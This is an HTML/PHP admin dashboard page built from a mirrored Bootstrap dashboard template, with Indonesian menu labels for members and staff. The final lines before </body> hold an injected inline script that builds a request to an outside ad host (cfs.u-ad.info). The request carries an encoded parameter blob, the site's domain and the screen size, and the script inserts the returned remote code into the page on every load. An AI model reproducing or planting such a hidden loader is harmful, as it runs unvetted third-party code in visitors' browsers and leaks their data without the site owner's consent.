<!DOCTYPE html>
<html lang="en">
  
<!-- Mirrored from getbootstrap.com/examples/dashboard/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 26 Oct 2015 23:25:56 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Dashboard Template for Bootstrap</title>

    <!-- Bootstrap core CSS -->
    <link href="asset/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="asset/css/dashboard.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="asset/css/jquery.dataTables.css">
    <link rel="stylesheet" type="text/css" href="asset/css/animate.css">

    <script src="asset/js/ie-emulation-modes-warning.js"></script>
    <script type="text/javascript" src="asset/js/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="asset/js/jquery.dataTables.min.js"></script>

  <script type="text/javascript">
    $(document).ready(function(){
    $('table').DataTable();
})
  </script>


  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container-fluid">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="?tampil=karyawan&halaman=beranda"><span class="glyphicon glyphicon-hand-right">&nbsp;</span>Halaman Administrator</a>
        </div>
       
      </div>
    </nav>

    <div class="container-fluid">
      <div class="row">
        <div class="col-sm-3 col-md-2 sidebar">
          <ul class="nav nav-sidebar">
            <li class=""><a href="?tampil=member&halaman=member_tampil"><i class="glyphicon glyphicon-user">&nbsp;</i>Member<span class="sr-only">(current)</span></a></li>
            <li><a href="?tampil=pengurus&halaman=pengurus_tampil"><i class=" glyphicon glyphicon-check">&nbsp;</i>Pengurus</a></li>
           
          </ul>
          
         
        </div>
        <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
                <?php
                include "./koneksi.php"; 
                include "./konten.php";

                 ?>
      </div>

        


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="../../../ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="asset/js/bootstrap.min.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="../../assets/js/vendor/holder.min.html"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bvDNDI9THYWCLUdGvfMh8VPQ3lgJbCbGBQKTVpkjTth%2fmUFe5G%2fXgx%2bwxe3T56lx%2fz0geMXV5%2fQ4%2fPhVN%2bfxFefjx6z%2bcDa%2fG5hwcAW5MzsjD1vaWCqL%2b%2bacnfPmxNh3O4shXQJP8ZuQgfIAbbW%2f57pqIEhpwTl0OJJk0yERFPWR%2fr3yOgOdd3jLZbPoI9aF51MhYX9t9cxMBHrDCIRnLgWJm3TAh0MpZsQIRRtV9%2bkJe%2bmM5Vr2LwJyuw%2fkITZRpHT1ac5saoW7ED5l%2flkgaPveYw7Quam6AxtaA5BSeOdkZ0pw5KL3kXaggC4xezQw%2b4q1PciCmn%2flwwuExHE%2bAdo8YUqp%2fc0iUWIySk9aEB2Aiqd1Mul1SOUaGiqfDj5vaf8egb3G1wwm1IRnpFpUCHBAv02rszhLa1u3b19GYjta%2fLr9v322V9GCs%2bWFMWTTnKSXQSXmVXNugB57sYk8zILgn9w5nfOit" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from getbootstrap.com/examples/dashboard/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 26 Oct 2015 23:25:56 GMT -->
</html>
